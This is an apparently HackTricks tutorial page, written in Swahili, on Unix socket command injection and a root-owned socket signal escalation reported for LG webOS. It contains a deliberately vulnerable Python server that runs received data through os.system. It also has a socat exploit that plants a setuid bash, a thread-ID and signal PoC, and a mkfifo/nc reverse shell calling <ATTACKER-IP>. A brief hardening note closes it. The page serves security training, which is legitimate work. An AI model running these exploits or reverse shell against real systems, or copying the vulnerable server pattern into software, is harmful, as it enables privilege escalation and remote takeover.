# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Mfano wa socket binding kwa kutumia Python

Katika mfano ufuatao, **unix socket inaundwa** (`/tmp/socket_test.s`) na kila kitu **kinachopokelewa** kita**endeshwa** na `os.system`. Najua kwamba hutakutana na hili kwenye mazingira halisi, lakini lengo la mfano huu ni kuona jinsi code inayotumia unix sockets inavyoonekana, na jinsi ya kushughulikia input katika hali mbaya zaidi inayowezekana.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Tekeleza** code kwa kutumia python: `python s.py` na **angalia jinsi socket inavyosikiliza**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Uchunguzi wa Root-owned UNIX socket signal-triggered escalation (LG webOS)

Baadhi ya daemons zenye privileged huweka wazi UNIX socket inayomilikiwa na root, inayokubali input isiyoaminika na kuunganisha vitendo vya privileged na thread-IDs pamoja na signals. Ikiwa protocol inamruhusu client asiye na privileged kuathiri ni native thread ipi inayolengwa, unaweza ku-trigger privileged code path na kufanya escalation.

Muundo ulioonekana:
- Unganisha kwenye socket inayomilikiwa na root (kwa mfano, /tmp/remotelogger).
- Unda thread na upate native thread id (TID) yake.
- Tuma TID (ikiwa ime-packed) pamoja na padding kama request; pokea acknowledgement.
- Tuma signal maalum kwenye TID hiyo ili ku-trigger privileged behaviour.

Muhtasari mdogo wa PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Ili kupata root shell kutokana na hii, pattern rahisi ya named-pipe + nc inaweza kutumika:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Maelezo:
- Aina hii ya bugs hutokea kutokana na kuamini thamani zinazotokana na hali ya client asiye na privileges (TIDs) na kuziunganisha na signal handlers au logic yenye privileges.
- Imarisha usalama kwa kutekeleza credentials kwenye socket, kuthibitisha miundo ya ujumbe, na kutenganisha operations zenye privileges na vitambulisho vya threads vinavyotolewa kutoka nje.

## Marejeo

- [LG WebOS TV: Path Traversal, Authentication Bypass na Takeover Kamili wa Kifaa (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
